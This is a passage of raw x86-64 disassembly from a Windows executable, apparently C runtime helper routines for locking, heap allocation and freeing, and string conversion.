   140007a46:	48 83 c4 20          	add    $0x20,%rsp
   140007a4a:	5b                   	pop    %rbx
   140007a4b:	48 ff 25 e6 78 00 00 	rex.W jmp *0x78e6(%rip)        # 0x14000f338
   140007a52:	cc                   	int3
   140007a53:	cc                   	int3
   140007a54:	40 53                	rex push %rbx
   140007a56:	48 83 ec 20          	sub    $0x20,%rsp
   140007a5a:	8b d9                	mov    %ecx,%ebx
   140007a5c:	4c 8d 0d 45 93 00 00 	lea    0x9345(%rip),%r9        # 0x140010da8
   140007a63:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007a68:	4c 8d 05 31 93 00 00 	lea    0x9331(%rip),%r8        # 0x140010da0
   140007a6f:	48 8d 15 32 8a 00 00 	lea    0x8a32(%rip),%rdx        # 0x1400104a8
   140007a76:	e8 e5 fc ff ff       	call   0x140007760
   140007a7b:	8b cb                	mov    %ebx,%ecx
   140007a7d:	48 85 c0             	test   %rax,%rax
   140007a80:	74 0c                	je     0x140007a8e
   140007a82:	48 83 c4 20          	add    $0x20,%rsp
   140007a86:	5b                   	pop    %rbx
   140007a87:	48 ff 25 ca 79 00 00 	rex.W jmp *0x79ca(%rip)        # 0x14000f458
   140007a8e:	48 83 c4 20          	add    $0x20,%rsp
   140007a92:	5b                   	pop    %rbx
   140007a93:	48 ff 25 8e 78 00 00 	rex.W jmp *0x788e(%rip)        # 0x14000f328
   140007a9a:	cc                   	int3
   140007a9b:	cc                   	int3
   140007a9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007aa1:	57                   	push   %rdi
   140007aa2:	48 83 ec 20          	sub    $0x20,%rsp
   140007aa6:	48 8b da             	mov    %rdx,%rbx
   140007aa9:	4c 8d 0d 00 93 00 00 	lea    0x9300(%rip),%r9        # 0x140010db0
   140007ab0:	8b f9                	mov    %ecx,%edi
   140007ab2:	48 8d 15 07 8a 00 00 	lea    0x8a07(%rip),%rdx        # 0x1400104c0
   140007ab9:	b9 06 00 00 00       	mov    $0x6,%ecx
   140007abe:	4c 8d 05 e3 92 00 00 	lea    0x92e3(%rip),%r8        # 0x140010da8
   140007ac5:	e8 96 fc ff ff       	call   0x140007760
   140007aca:	48 8b d3             	mov    %rbx,%rdx
   140007acd:	8b cf                	mov    %edi,%ecx
   140007acf:	48 85 c0             	test   %rax,%rax
   140007ad2:	74 08                	je     0x140007adc
   140007ad4:	ff 15 7e 79 00 00    	call   *0x797e(%rip)        # 0x14000f458
   140007ada:	eb 06                	jmp    0x140007ae2
   140007adc:	ff 15 4e 78 00 00    	call   *0x784e(%rip)        # 0x14000f330
   140007ae2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007ae7:	48 83 c4 20          	add    $0x20,%rsp
   140007aeb:	5f                   	pop    %rdi
   140007aec:	c3                   	ret
   140007aed:	cc                   	int3
   140007aee:	cc                   	int3
   140007aef:	cc                   	int3
   140007af0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007af5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007afa:	57                   	push   %rdi
   140007afb:	48 83 ec 20          	sub    $0x20,%rsp
   140007aff:	41 8b f0             	mov    %r8d,%esi
   140007b02:	4c 8d 0d af 92 00 00 	lea    0x92af(%rip),%r9        # 0x140010db8
   140007b09:	8b da                	mov    %edx,%ebx
   140007b0b:	4c 8d 05 9e 92 00 00 	lea    0x929e(%rip),%r8        # 0x140010db0
   140007b12:	48 8b f9             	mov    %rcx,%rdi
   140007b15:	48 8d 15 bc 89 00 00 	lea    0x89bc(%rip),%rdx        # 0x1400104d8
   140007b1c:	b9 12 00 00 00       	mov    $0x12,%ecx
   140007b21:	e8 3a fc ff ff       	call   0x140007760
   140007b26:	8b d3                	mov    %ebx,%edx
   140007b28:	48 8b cf             	mov    %rdi,%rcx
   140007b2b:	48 85 c0             	test   %rax,%rax
   140007b2e:	74 0b                	je     0x140007b3b
   140007b30:	44 8b c6             	mov    %esi,%r8d
   140007b33:	ff 15 1f 79 00 00    	call   *0x791f(%rip)        # 0x14000f458
   140007b39:	eb 06                	jmp    0x140007b41
   140007b3b:	ff 15 d7 77 00 00    	call   *0x77d7(%rip)        # 0x14000f318
   140007b41:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b46:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007b4b:	48 83 c4 20          	add    $0x20,%rsp
   140007b4f:	5f                   	pop    %rdi
   140007b50:	c3                   	ret
   140007b51:	cc                   	int3
   140007b52:	cc                   	int3
   140007b53:	cc                   	int3
   140007b54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b59:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007b5e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007b63:	57                   	push   %rdi
   140007b64:	48 83 ec 50          	sub    $0x50,%rsp
   140007b68:	41 8b d9             	mov    %r9d,%ebx
   140007b6b:	49 8b f8             	mov    %r8,%rdi
   140007b6e:	8b f2                	mov    %edx,%esi
   140007b70:	4c 8d 0d 49 92 00 00 	lea    0x9249(%rip),%r9        # 0x140010dc0
   140007b77:	48 8b e9             	mov    %rcx,%rbp
   140007b7a:	4c 8d 05 37 92 00 00 	lea    0x9237(%rip),%r8        # 0x140010db8
   140007b81:	48 8d 15 38 92 00 00 	lea    0x9238(%rip),%rdx        # 0x140010dc0
   140007b88:	b9 14 00 00 00       	mov    $0x14,%ecx
   140007b8d:	e8 ce fb ff ff       	call   0x140007760
   140007b92:	48 85 c0             	test   %rax,%rax
   140007b95:	74 52                	je     0x140007be9
   140007b97:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140007b9e:	00 
   140007b9f:	44 8b cb             	mov    %ebx,%r9d
   140007ba2:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140007ba9:	00 
   140007baa:	8b d6                	mov    %esi,%edx
   140007bac:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140007bb1:	4c 8b c7             	mov    %rdi,%r8
   140007bb4:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140007bb9:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140007bc0:	00 
   140007bc1:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007bc6:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140007bcd:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140007bd1:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140007bd8:	00 
   140007bd9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007bde:	48 8b cd             	mov    %rbp,%rcx
   140007be1:	ff 15 71 78 00 00    	call   *0x7871(%rip)        # 0x14000f458
   140007be7:	eb 32                	jmp    0x140007c1b
   140007be9:	33 d2                	xor    %edx,%edx
   140007beb:	48 8b cd             	mov    %rbp,%rcx
   140007bee:	e8 3d 00 00 00       	call   0x140007c30
   140007bf3:	8b c8                	mov    %eax,%ecx
   140007bf5:	44 8b cb             	mov    %ebx,%r9d
   140007bf8:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140007bff:	4c 8b c7             	mov    %rdi,%r8
   140007c02:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007c06:	8b d6                	mov    %esi,%edx
   140007c08:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140007c0f:	00 
   140007c10:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007c15:	ff 15 45 77 00 00    	call   *0x7745(%rip)        # 0x14000f360
   140007c1b:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140007c20:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140007c25:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007c2a:	48 83 c4 50          	add    $0x50,%rsp
   140007c2e:	5f                   	pop    %rdi
   140007c2f:	c3                   	ret
   140007c30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c35:	57                   	push   %rdi
   140007c36:	48 83 ec 20          	sub    $0x20,%rsp
   140007c3a:	8b fa                	mov    %edx,%edi
   140007c3c:	4c 8d 0d 95 91 00 00 	lea    0x9195(%rip),%r9        # 0x140010dd8
   140007c43:	48 8b d9             	mov    %rcx,%rbx
   140007c46:	48 8d 15 8b 91 00 00 	lea    0x918b(%rip),%rdx        # 0x140010dd8
   140007c4d:	b9 16 00 00 00       	mov    $0x16,%ecx
   140007c52:	4c 8d 05 77 91 00 00 	lea    0x9177(%rip),%r8        # 0x140010dd0
   140007c59:	e8 02 fb ff ff       	call   0x140007760
   140007c5e:	48 8b cb             	mov    %rbx,%rcx
   140007c61:	48 85 c0             	test   %rax,%rax
   140007c64:	74 0a                	je     0x140007c70
   140007c66:	8b d7                	mov    %edi,%edx
   140007c68:	ff 15 ea 77 00 00    	call   *0x77ea(%rip)        # 0x14000f458
   140007c6e:	eb 05                	jmp    0x140007c75
   140007c70:	e8 df 34 00 00       	call   0x14000b154
   140007c75:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c7a:	48 83 c4 20          	add    $0x20,%rsp
   140007c7e:	5f                   	pop    %rdi
   140007c7f:	c3                   	ret
   140007c80:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140007c85:	48 8d 3d 94 37 01 00 	lea    0x13794(%rip),%rdi        # 0x14001b420
   140007c8c:	48 8d 05 9d 38 01 00 	lea    0x1389d(%rip),%rax        # 0x14001b530
   140007c93:	48 3b c7             	cmp    %rdi,%rax
   140007c96:	48 8b 05 63 23 01 00 	mov    0x12363(%rip),%rax        # 0x14001a000
   140007c9d:	48 1b c9             	sbb    %rcx,%rcx
   140007ca0:	48 f7 d1             	not    %rcx
   140007ca3:	83 e1 22             	and    $0x22,%ecx
   140007ca6:	f3 48 ab             	rep stos %rax,(%rdi)
   140007ca9:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140007cae:	b0 01                	mov    $0x1,%al
   140007cb0:	c3                   	ret
   140007cb1:	cc                   	int3
   140007cb2:	cc                   	int3
   140007cb3:	cc                   	int3
   140007cb4:	40 53                	rex push %rbx
   140007cb6:	48 83 ec 20          	sub    $0x20,%rsp
   140007cba:	84 c9                	test   %cl,%cl
   140007cbc:	75 2f                	jne    0x140007ced
   140007cbe:	48 8d 1d bb 36 01 00 	lea    0x136bb(%rip),%rbx        # 0x14001b380
   140007cc5:	48 8b 0b             	mov    (%rbx),%rcx
   140007cc8:	48 85 c9             	test   %rcx,%rcx
   140007ccb:	74 10                	je     0x140007cdd
   140007ccd:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140007cd1:	74 06                	je     0x140007cd9
   140007cd3:	ff 15 67 74 00 00    	call   *0x7467(%rip)        # 0x14000f140
   140007cd9:	48 83 23 00          	andq   $0x0,(%rbx)
   140007cdd:	48 83 c3 08          	add    $0x8,%rbx
   140007ce1:	48 8d 05 38 37 01 00 	lea    0x13738(%rip),%rax        # 0x14001b420
   140007ce8:	48 3b d8             	cmp    %rax,%rbx
   140007ceb:	75 d8                	jne    0x140007cc5
   140007ced:	b0 01                	mov    $0x1,%al
   140007cef:	48 83 c4 20          	add    $0x20,%rsp
   140007cf3:	5b                   	pop    %rbx
   140007cf4:	c3                   	ret
   140007cf5:	cc                   	int3
   140007cf6:	cc                   	int3
   140007cf7:	cc                   	int3
   140007cf8:	40 53                	rex push %rbx
   140007cfa:	48 83 ec 20          	sub    $0x20,%rsp
   140007cfe:	48 8b 05 2b 38 01 00 	mov    0x1382b(%rip),%rax        # 0x14001b530
   140007d05:	48 8b da             	mov    %rdx,%rbx
   140007d08:	48 39 02             	cmp    %rax,(%rdx)
   140007d0b:	74 16                	je     0x140007d23
   140007d0d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007d13:	85 05 97 2a 01 00    	test   %eax,0x12a97(%rip)        # 0x14001a7b0
   140007d19:	75 08                	jne    0x140007d23
   140007d1b:	e8 ec 28 00 00       	call   0x14000a60c
   140007d20:	48 89 03             	mov    %rax,(%rbx)
   140007d23:	48 83 c4 20          	add    $0x20,%rsp
   140007d27:	5b                   	pop    %rbx
   140007d28:	c3                   	ret
   140007d29:	cc                   	int3
   140007d2a:	cc                   	int3
   140007d2b:	cc                   	int3
   140007d2c:	40 53                	rex push %rbx
   140007d2e:	48 83 ec 20          	sub    $0x20,%rsp
   140007d32:	48 8b 05 4f 3a 01 00 	mov    0x13a4f(%rip),%rax        # 0x14001b788
   140007d39:	48 8b da             	mov    %rdx,%rbx
   140007d3c:	48 39 02             	cmp    %rax,(%rdx)
   140007d3f:	74 16                	je     0x140007d57
   140007d41:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007d47:	85 05 63 2a 01 00    	test   %eax,0x12a63(%rip)        # 0x14001a7b0
   140007d4d:	75 08                	jne    0x140007d57
   140007d4f:	e8 8c 15 00 00       	call   0x1400092e0
   140007d54:	48 89 03             	mov    %rax,(%rbx)
   140007d57:	48 83 c4 20          	add    $0x20,%rsp
   140007d5b:	5b                   	pop    %rbx
   140007d5c:	c3                   	ret
   140007d5d:	cc                   	int3
   140007d5e:	cc                   	int3
   140007d5f:	cc                   	int3
   140007d60:	48 83 ec 28          	sub    $0x28,%rsp
   140007d64:	e8 fb f3 ff ff       	call   0x140007164
   140007d69:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007d6e:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140007d75:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007d7a:	48 8b c8             	mov    %rax,%rcx
   140007d7d:	e8 76 ff ff ff       	call   0x140007cf8
   140007d82:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007d87:	48 8b 00             	mov    (%rax),%rax
   140007d8a:	48 83 c4 28          	add    $0x28,%rsp
   140007d8e:	c3                   	ret
   140007d8f:	cc                   	int3
   140007d90:	40 53                	rex push %rbx
   140007d92:	48 83 ec 20          	sub    $0x20,%rsp
   140007d96:	33 db                	xor    %ebx,%ebx
   140007d98:	48 8d 15 a1 37 01 00 	lea    0x137a1(%rip),%rdx        # 0x14001b540
   140007d9f:	45 33 c0             	xor    %r8d,%r8d
   140007da2:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140007da6:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140007daa:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140007daf:	e8 3c fd ff ff       	call   0x140007af0
   140007db4:	85 c0                	test   %eax,%eax
   140007db6:	74 11                	je     0x140007dc9
   140007db8:	ff 05 b2 39 01 00    	incl   0x139b2(%rip)        # 0x14001b770
   140007dbe:	ff c3                	inc    %ebx
   140007dc0:	83 fb 0e             	cmp    $0xe,%ebx
   140007dc3:	72 d3                	jb     0x140007d98
   140007dc5:	b0 01                	mov    $0x1,%al
   140007dc7:	eb 09                	jmp    0x140007dd2
   140007dc9:	33 c9                	xor    %ecx,%ecx
   140007dcb:	e8 24 00 00 00       	call   0x140007df4
   140007dd0:	32 c0                	xor    %al,%al
   140007dd2:	48 83 c4 20          	add    $0x20,%rsp
   140007dd6:	5b                   	pop    %rbx
   140007dd7:	c3                   	ret
   140007dd8:	48 63 c1             	movslq %ecx,%rax
   140007ddb:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140007ddf:	48 8d 05 5a 37 01 00 	lea    0x1375a(%rip),%rax        # 0x14001b540
   140007de6:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007dea:	48 ff 25 0f 75 00 00 	rex.W jmp *0x750f(%rip)        # 0x14000f300
   140007df1:	cc                   	int3
   140007df2:	cc                   	int3
   140007df3:	cc                   	int3
   140007df4:	40 53                	rex push %rbx
   140007df6:	48 83 ec 20          	sub    $0x20,%rsp
   140007dfa:	8b 1d 70 39 01 00    	mov    0x13970(%rip),%ebx        # 0x14001b770
   140007e00:	eb 1d                	jmp    0x140007e1f
   140007e02:	48 8d 05 37 37 01 00 	lea    0x13737(%rip),%rax        # 0x14001b540
   140007e09:	ff cb                	dec    %ebx
   140007e0b:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140007e0f:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007e13:	ff 15 f7 74 00 00    	call   *0x74f7(%rip)        # 0x14000f310
   140007e19:	ff 0d 51 39 01 00    	decl   0x13951(%rip)        # 0x14001b770
   140007e1f:	85 db                	test   %ebx,%ebx
   140007e21:	75 df                	jne    0x140007e02
   140007e23:	b0 01                	mov    $0x1,%al
   140007e25:	48 83 c4 20          	add    $0x20,%rsp
   140007e29:	5b                   	pop    %rbx
   140007e2a:	c3                   	ret
   140007e2b:	cc                   	int3
   140007e2c:	48 63 c1             	movslq %ecx,%rax
   140007e2f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140007e33:	48 8d 05 06 37 01 00 	lea    0x13706(%rip),%rax        # 0x14001b540
   140007e3a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007e3e:	48 ff 25 c3 74 00 00 	rex.W jmp *0x74c3(%rip)        # 0x14000f308
   140007e45:	cc                   	int3
   140007e46:	cc                   	int3
   140007e47:	cc                   	int3
   140007e48:	40 53                	rex push %rbx
   140007e4a:	48 83 ec 20          	sub    $0x20,%rsp
   140007e4e:	48 8b d9             	mov    %rcx,%rbx
   140007e51:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   140007e55:	77 3c                	ja     0x140007e93
   140007e57:	48 85 c9             	test   %rcx,%rcx
   140007e5a:	b8 01 00 00 00       	mov    $0x1,%eax
   140007e5f:	48 0f 44 d8          	cmove  %rax,%rbx
   140007e63:	eb 15                	jmp    0x140007e7a
   140007e65:	e8 22 e8 ff ff       	call   0x14000668c
   140007e6a:	85 c0                	test   %eax,%eax
   140007e6c:	74 25                	je     0x140007e93
   140007e6e:	48 8b cb             	mov    %rbx,%rcx
   140007e71:	e8 6a da ff ff       	call   0x1400058e0
   140007e76:	85 c0                	test   %eax,%eax
   140007e78:	74 19                	je     0x140007e93
   140007e7a:	48 8b 0d 5f 3d 01 00 	mov    0x13d5f(%rip),%rcx        # 0x14001bbe0
   140007e81:	4c 8b c3             	mov    %rbx,%r8
   140007e84:	33 d2                	xor    %edx,%edx
   140007e86:	ff 15 dc 74 00 00    	call   *0x74dc(%rip)        # 0x14000f368
   140007e8c:	48 85 c0             	test   %rax,%rax
   140007e8f:	74 d4                	je     0x140007e65
   140007e91:	eb 0d                	jmp    0x140007ea0
   140007e93:	e8 a8 f8 ff ff       	call   0x140007740
   140007e98:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007e9e:	33 c0                	xor    %eax,%eax
   140007ea0:	48 83 c4 20          	add    $0x20,%rsp
   140007ea4:	5b                   	pop    %rbx
   140007ea5:	c3                   	ret
   140007ea6:	cc                   	int3
   140007ea7:	cc                   	int3
   140007ea8:	40 53                	rex push %rbx
   140007eaa:	48 83 ec 20          	sub    $0x20,%rsp
   140007eae:	4c 8b c2             	mov    %rdx,%r8
   140007eb1:	48 8b d9             	mov    %rcx,%rbx
   140007eb4:	48 85 c9             	test   %rcx,%rcx
   140007eb7:	74 0e                	je     0x140007ec7
   140007eb9:	33 d2                	xor    %edx,%edx
   140007ebb:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140007ebf:	48 f7 f3             	div    %rbx
   140007ec2:	49 3b c0             	cmp    %r8,%rax
   140007ec5:	72 43                	jb     0x140007f0a
   140007ec7:	49 0f af d8          	imul   %r8,%rbx
   140007ecb:	b8 01 00 00 00       	mov    $0x1,%eax
   140007ed0:	48 85 db             	test   %rbx,%rbx
   140007ed3:	48 0f 44 d8          	cmove  %rax,%rbx
   140007ed7:	eb 15                	jmp    0x140007eee
   140007ed9:	e8 ae e7 ff ff       	call   0x14000668c
   140007ede:	85 c0                	test   %eax,%eax
   140007ee0:	74 28                	je     0x140007f0a
   140007ee2:	48 8b cb             	mov    %rbx,%rcx
   140007ee5:	e8 f6 d9 ff ff       	call   0x1400058e0
   140007eea:	85 c0                	test   %eax,%eax
   140007eec:	74 1c                	je     0x140007f0a
   140007eee:	48 8b 0d eb 3c 01 00 	mov    0x13ceb(%rip),%rcx        # 0x14001bbe0
   140007ef5:	4c 8b c3             	mov    %rbx,%r8
   140007ef8:	ba 08 00 00 00       	mov    $0x8,%edx
   140007efd:	ff 15 65 74 00 00    	call   *0x7465(%rip)        # 0x14000f368
   140007f03:	48 85 c0             	test   %rax,%rax
   140007f06:	74 d1                	je     0x140007ed9
   140007f08:	eb 0d                	jmp    0x140007f17
   140007f0a:	e8 31 f8 ff ff       	call   0x140007740
   140007f0f:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007f15:	33 c0                	xor    %eax,%eax
   140007f17:	48 83 c4 20          	add    $0x20,%rsp
   140007f1b:	5b                   	pop    %rbx
   140007f1c:	c3                   	ret
   140007f1d:	cc                   	int3
   140007f1e:	cc                   	int3
   140007f1f:	cc                   	int3
   140007f20:	48 85 c9             	test   %rcx,%rcx
   140007f23:	74 37                	je     0x140007f5c
   140007f25:	53                   	push   %rbx
   140007f26:	48 83 ec 20          	sub    $0x20,%rsp
   140007f2a:	4c 8b c1             	mov    %rcx,%r8
   140007f2d:	33 d2                	xor    %edx,%edx
   140007f2f:	48 8b 0d aa 3c 01 00 	mov    0x13caa(%rip),%rcx        # 0x14001bbe0
   140007f36:	ff 15 34 74 00 00    	call   *0x7434(%rip)        # 0x14000f370
   140007f3c:	85 c0                	test   %eax,%eax
   140007f3e:	75 17                	jne    0x140007f57
   140007f40:	e8 fb f7 ff ff       	call   0x140007740
   140007f45:	48 8b d8             	mov    %rax,%rbx
   140007f48:	ff 15 82 71 00 00    	call   *0x7182(%rip)        # 0x14000f0d0
   140007f4e:	8b c8                	mov    %eax,%ecx
   140007f50:	e8 33 f7 ff ff       	call   0x140007688
   140007f55:	89 03                	mov    %eax,(%rbx)
   140007f57:	48 83 c4 20          	add    $0x20,%rsp
   140007f5b:	5b                   	pop    %rbx
   140007f5c:	c3                   	ret
   140007f5d:	cc                   	int3
   140007f5e:	cc                   	int3
   140007f5f:	cc                   	int3
   140007f60:	48 3b ca             	cmp    %rdx,%rcx
   140007f63:	73 04                	jae    0x140007f69
   140007f65:	83 c8 ff             	or     $0xffffffff,%eax
   140007f68:	c3                   	ret
   140007f69:	33 c0                	xor    %eax,%eax
   140007f6b:	48 3b ca             	cmp    %rdx,%rcx
   140007f6e:	0f 97 c0             	seta   %al
   140007f71:	c3                   	ret
   140007f72:	cc                   	int3
   140007f73:	cc                   	int3
   140007f74:	48 8b c4             	mov    %rsp,%rax
   140007f77:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007f7b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007f7f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007f83:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007f87:	41 56                	push   %r14
   140007f89:	48 83 ec 30          	sub    $0x30,%rsp
   140007f8d:	33 db                	xor    %ebx,%ebx
   140007f8f:	41 8b e8             	mov    %r8d,%ebp
   140007f92:	48 8b fa             	mov    %rdx,%rdi
   140007f95:	48 8b f1             	mov    %rcx,%rsi
   140007f98:	48 85 c9             	test   %rcx,%rcx
   140007f9b:	75 22                	jne    0x140007fbf
   140007f9d:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007fa0:	74 0c                	je     0x140007fae
   140007fa2:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140007fa6:	e8 75 ff ff ff       	call   0x140007f20
   140007fab:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007fae:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140007fb2:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140007fb6:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   140007fba:	e9 0e 01 00 00       	jmp    0x1400080cd
   140007fbf:	38 19                	cmp    %bl,(%rcx)
   140007fc1:	75 55                	jne    0x140008018
   140007fc3:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140007fc7:	75 46                	jne    0x14000800f
   140007fc9:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007fcc:	74 0c                	je     0x140007fda
   140007fce:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140007fd2:	e8 49 ff ff ff       	call   0x140007f20
   140007fd7:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007fda:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007fdf:	e8 64 fe ff ff       	call   0x140007e48
   140007fe4:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140007fe8:	48 8b cb             	mov    %rbx,%rcx
   140007feb:	48 f7 d8             	neg    %rax
   140007fee:	1b d2                	sbb    %edx,%edx
   140007ff0:	f7 d2                	not    %edx
   140007ff2:	83 e2 0c             	and    $0xc,%edx
   140007ff5:	0f 94 c1             	sete   %cl
   140007ff8:	85 d2                	test   %edx,%edx
   140007ffa:	0f 94 c0             	sete   %al
   140007ffd:	88 47 28             	mov    %al,0x28(%rdi)
   140008000:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140008004:	85 d2                	test   %edx,%edx
   140008006:	74 07                	je     0x14000800f
   140008008:	8b da                	mov    %edx,%ebx
   14000800a:	e9 be 00 00 00       	jmp    0x1400080cd
   14000800f:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140008013:	66 89 18             	mov    %bx,(%rax)
   140008016:	eb 9e                	jmp    0x140007fb6
   140008018:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000801c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140008020:	4c 8b c6             	mov    %rsi,%r8
   140008023:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008028:	8b cd                	mov    %ebp,%ecx
   14000802a:	41 8d 51 0a          	lea    0xa(%r9),%edx
   14000802e:	e8 39 16 00 00       	call   0x14000966c
   140008033:	4c 63 f0             	movslq %eax,%r14
   140008036:	85 c0                	test   %eax,%eax
   140008038:	75 16                	jne    0x140008050
   14000803a:	ff 15 90 70 00 00    	call   *0x7090(%rip)        # 0x14000f0d0
   140008040:	8b c8                	mov    %eax,%ecx
   140008042:	e8 89 f6 ff ff       	call   0x1400076d0
   140008047:	e8 f4 f6 ff ff       	call   0x140007740
   14000804c:	8b 18                	mov    (%rax),%ebx
   14000804e:	eb 7d                	jmp    0x1400080cd
   140008050:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140008054:	4c 3b f1             	cmp    %rcx,%r14
   140008057:	76 43                	jbe    0x14000809c
   140008059:	38 5f 28             	cmp    %bl,0x28(%rdi)
   14000805c:	74 0c                	je     0x14000806a
   14000805e:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140008062:	e8 b9 fe ff ff       	call   0x140007f20
   140008067:	88 5f 28             	mov    %bl,0x28(%rdi)
   14000806a:	4b 8d 0c 36          	lea    (%r14,%r14,1),%rcx
   14000806e:	e8 d5 fd ff ff       	call   0x140007e48
   140008073:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140008077:	48 8b cb             	mov    %rbx,%rcx
   14000807a:	48 f7 d8             	neg    %rax
   14000807d:	1b d2                	sbb    %edx,%edx
   14000807f:	f7 d2                	not    %edx
   140008081:	83 e2 0c             	and    $0xc,%edx
   140008084:	49 0f 44 ce          	cmove  %r14,%rcx
   140008088:	85 d2                	test   %edx,%edx
   14000808a:	0f 94 c0             	sete   %al
   14000808d:	88 47 28             	mov    %al,0x28(%rdi)
   140008090:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140008094:	85 d2                	test   %edx,%edx
   140008096:	0f 85 6c ff ff ff    	jne    0x140008008
   14000809c:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400080a0:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400080a4:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400080a8:	4c 8b c6             	mov    %rsi,%r8
   1400080ab:	8b cd                	mov    %ebp,%ecx
   1400080ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400080b2:	41 8d 51 0a          	lea    0xa(%r9),%edx
   1400080b6:	e8 b1 15 00 00       	call   0x14000966c
   1400080bb:	48 63 c8             	movslq %eax,%rcx
   1400080be:	85 c0                	test   %eax,%eax
   1400080c0:	0f 84 74 ff ff ff    	je     0x14000803a
   1400080c6:	48 ff c9             	dec    %rcx
   1400080c9:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   1400080cd:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400080d2:	8b c3                	mov    %ebx,%eax
   1400080d4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400080d9:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400080de:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400080e3:	48 83 c4 30          	add    $0x30,%rsp
   1400080e7:	41 5e                	pop    %r14
   1400080e9:	c3                   	ret
   1400080ea:	cc                   	int3
   1400080eb:	cc                   	int3
   1400080ec:	48 8b c4             	mov    %rsp,%rax
   1400080ef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400080f3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400080f7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400080fb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400080ff:	41 56                	push   %r14
   140008101:	48 83 ec 40          	sub    $0x40,%rsp
   140008105:	33 db                	xor    %ebx,%ebx
   140008107:	45 8b f0             	mov    %r8d,%r14d
   14000810a:	48 8b fa             	mov    %rdx,%rdi
